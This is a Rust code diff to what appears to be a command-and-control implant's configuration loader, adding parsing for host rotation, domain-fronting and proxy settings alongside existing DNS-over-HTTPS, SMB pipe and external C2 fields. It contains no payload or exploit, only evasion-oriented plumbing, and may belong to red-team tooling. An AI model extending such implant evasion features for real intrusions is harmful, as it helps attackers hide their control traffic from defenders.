@@ -184,20 +184,33 @@ pub fn load_runtime_config() -> Option<(crate::config::Config, ImplantConfig, Ve
 
     // Channel dispatcher fields (spec-1). Old server-generated configs stop
     // after expires_at — `remaining()==0` → default to Https-only.
-    let (primary_channel, fallback_bitmap, doh_resolver, smb_pipe_name, extc2_api_host, extc2_token) =
+    let (primary_channel, fallback_bitmap, doh_resolver, smb_pipe_name, extc2_api_host, extc2_token,
+         rotation_hosts, fronting_host, proxy_server) =
         if r.remaining() > 0 {
-            (
-                r.u8().ok().unwrap_or(0),
-                r.u8().ok().unwrap_or(0),
-                r.str().ok().unwrap_or_default(),
-                r.str().ok().unwrap_or_default(),
-                r.str().ok().unwrap_or_default(),
-                r.str().ok().unwrap_or_default(),
-            )
+            let pc = r.u8().ok().unwrap_or(0);
+            let fb = r.u8().ok().unwrap_or(0);
+            let dr = r.str().ok().unwrap_or_default();
+            let sp = r.str().ok().unwrap_or_default();
+            let eh = r.str().ok().unwrap_or_default();
+            let et = r.str().ok().unwrap_or_default();
+            // spec-7 HTTP enhancement fields — further backward compat layer.
+            let (rh, fh, ps) = if r.remaining() > 0 {
+                (
+                    r.str().ok().unwrap_or_default(),
+                    r.str().ok().unwrap_or_default(),
+                    r.str().ok().unwrap_or_default(),
+                )
+            } else {
+                (crate::heap::String::new(), crate::heap::String::new(), crate::heap::String::new())
+            };
+            (pc, fb, dr, sp, eh, et, rh, fh, ps)
         } else {
             (
                 0u8,
                 0u8,
+                crate::heap::String::new(),
+                crate::heap::String::new(),
+                crate::heap::String::new(),
                 crate::heap::String::new(),
                 crate::heap::String::new(),
                 crate::heap::String::new(),
@@ -219,6 +232,9 @@ pub fn load_runtime_config() -> Option<(crate::config::Config, ImplantConfig, Ve
         smb_pipe_name,
         extc2_api_host,
         extc2_token,
+        rotation_hosts,
+        fronting_host,
+        proxy_server,
     };
 
     let implant = ImplantConfig {
